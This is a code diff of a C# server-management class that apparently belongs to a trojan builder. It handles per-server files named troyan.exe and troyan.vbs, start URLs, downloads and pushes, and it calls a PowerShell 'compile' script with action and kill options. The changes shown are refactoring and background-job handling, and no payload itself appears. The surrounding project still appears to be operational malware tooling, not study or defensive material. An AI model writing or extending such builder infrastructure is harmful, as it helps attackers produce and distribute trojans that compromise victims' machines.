@@ -18,11 +18,12 @@ public class ServerService
     {
 
     }
+
     public string SysScript(string scriptName)
     {
         return Path.Combine(ServerModelLoader.SysDirStatic, scriptName + ".ps1");
     }
-        
+
     private static string ServerDir(string serverName)
     {
         return Path.Combine(ServerModelLoader.RootDataStatic, serverName);
@@ -52,7 +53,7 @@ public class ServerService
     {
         return Path.Combine(ServerDir(serverName), "troyan.exe");
     }
-        
+
     public string GetExeMono(string serverName)
     {
         return Path.Combine(ServerDir(serverName), "troyan_mono.exe");
@@ -62,12 +63,12 @@ public class ServerService
     {
         return Path.Combine(ServerDir(serverName), "troyan.exe");
     }
-        
+
     public string GetVbs(string serverName)
     {
         return Path.Combine(ServerDir(serverName), "troyan.vbs");
     }
-        
+
     public string BuildVbs(string serverName, string url)
     {
         return Path.Combine(ServerDir(serverName), "troyan.vbs");
@@ -92,8 +93,21 @@ public class ServerService
     {
         File.Delete(GetFront(serverName, embeddingName));
     }
-    
-    private static JsonSerializerOptions JSO = new() { WriteIndented = true, DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull};
+
+    private static JsonSerializerOptions JSO = new()
+        { WriteIndented = true, DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull };
+
+    public ServerModel GetServerLite(string serverName)
+    {
+        var server = JsonSerializer.Deserialize<ServerModel>(File.ReadAllText(DataFile(serverName)), JSO)!;
+        return server;
+    }
+
+    public void SaveServerLite(string serverName, ServerModel server)
+    {
+        File.WriteAllText(DataFile(serverName),
+            JsonSerializer.Serialize(server, JSO));
+    }
 
     public ServerResult GetServer(string serverName, bool updateDns,  bool create = false, string alias = "", string pass = "")
     {
@@ -123,28 +137,28 @@ public class ServerService
                 if (server.DnSponsor == null)
                     server.DnSponsor = new List<DnSponsorModel>();
             }
-            catch(Exception e)
+            catch (Exception e)
             {
                 if (create)
                 {
                     server = new ServerModel()
                     {
-                        StartUrls = new List<string>(), StartDownloads = new List<string>(), Pushes = new List<string>()
-                        ,Server = serverName, Alias = alias
+                        StartUrls = new List<string>(), StartDownloads = new List<string>(),
+                        Pushes = new List<string>(), Server = serverName, Alias = alias
                     };
                     
+                    if (!string.IsNullOrEmpty(pass))
+                        server.Password = pass;
+
                     File.WriteAllText(DataFile(serverName),
                         JsonSerializer.Serialize(server, JSO));
                 }
                 else
                 {
-                    server.Result = e.Message;
-                    return new ServerResult() { Exception = e, ServerModel = server };    
+                    server.LastResult = e.Message;
+                    return new ServerResult() { Exception = e, ServerModel = server };
                 }
             }
-
-            if (create && !string.IsNullOrEmpty(pass))
-                server.Password = pass;
 
             server.Server = serverName;
 
@@ -174,14 +188,13 @@ public class ServerService
                 server.Front = Directory.GetFiles(FrontDir(serverName)).Select(a => Path.GetFileName(a))
                     .ToList();
 
-            File.WriteAllText(DataFile(serverName),
-                JsonSerializer.Serialize(server, JSO));
+            SaveServerLite(serverName, server);
 
             return new ServerResult() { ServerModel = server };
         }
         catch (Exception e)
         {
-            server.Result = e.Message;
+            server.LastResult = e.Message;
             return new ServerResult() { Exception = e, ServerModel = server };
         }
     }
@@ -269,7 +282,7 @@ public class ServerService
             server.SecondaryDns = server.StrahServer;
     }
 
-    public string PostServer(string serverName, ServerModel serverModel, string action, string kill)
+    public string PostServer(string serverName, ServerModel serverModel, bool realWork, string action, string kill)
     {
         if (!Directory.Exists(ServerDir(serverName)))
             return $"Server {serverName} is not registered";
@@ -284,16 +297,38 @@ public class ServerService
             
         UpdateDnSponsor(serverModel);
 
-        File.WriteAllText(DataFile(serverName),
-            JsonSerializer.Serialize(serverModel, JSO));
+        SaveServerLite(serverName, serverModel);
 
-        if (action != "none")
+        if (realWork == false)
         {
-            var result = RunScript(serverModel.Server, SysScript("compile"),
-                new ValueTuple<string, object>("serverName", serverModel.Server),
-                new ValueTuple<string, object>("action", action), new ValueTuple<string, object>("kill", kill));
+            serverModel.MarkOperation(action);
+            SaveServerLite(serverName, serverModel);
+            var process = new Process
+            {
+                StartInfo = new ProcessStartInfo
+                {
+                    FileName = ServerModelLoader.Refiner,
+                    Arguments = $"{serverName}",
+                    CreateNoWindow = true,
+                    UseShellExecute = true,
+                    RedirectStandardOutput = false,
+                    RedirectStandardError = false 
+                }
+            };
+            process.Start();
+        }
+        else
+        {
+            if (action != "none")
+            {
+                var script = SysScript("compile");
+                var result = RunScript(serverModel.Server, script,
+                    new ValueTuple<string, object>("serverName", serverModel.Server),
+                    new ValueTuple<string, object>("action", action), new ValueTuple<string, object>("kill", kill),
+                    new ValueTuple<string, object>("refiner","refiner"));
 
-            return result;
+                return result;
+            }
         }
         return "OK";
     }
@@ -317,13 +352,35 @@ public class ServerService
         }
         return result;
     }
-    
+
+    public void ForegroundServer(string serverName)
+    {
+        var srv = GetServerLite(serverName);
+        if (srv.HasToWork)
+        {
+            try
+            {
+                var res = GetServer(serverName, true);
+                if (res.Exception != null)
+                    throw res.Exception;
+                srv = res.ServerModel;
+                srv.LastResult = PostServer(serverName, srv, true, srv.Operation, "don't");
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e);
+            }
+            srv.MarkReady();
+            SaveServerLite(serverName, srv);
+        }
+    }
+
     public ServerResult RefineServerLite(string serverName)
     {
         var srv = GetServer(serverName, false);
         if (srv.Exception != null)
             Console.WriteLine(srv.Exception.Message);
-        PostServer(serverName, srv.ServerModel, "none", "don't");
+        PostServer(serverName, srv.ServerModel, true, "none", "don't");
         Console.WriteLine(srv.ServerModel.UserDataDir);
         return srv;
     }
@@ -339,11 +396,12 @@ public class ServerService
             return srv;
         if (srv.ServerModel == null)
             return srv;
-        PostServer(serverName, srv.ServerModel, "exe", "don't");
+        PostServer(serverName, srv.ServerModel, true ,"exe", "don't");
         Console.WriteLine(srv.ServerModel.UserDataDir);
         return srv;
     }
-        
+
+
     public string RunScript(string server, string scriptfILE, params (string Name, object Value)[] parameters)
     {
         using (Process process = new Process())
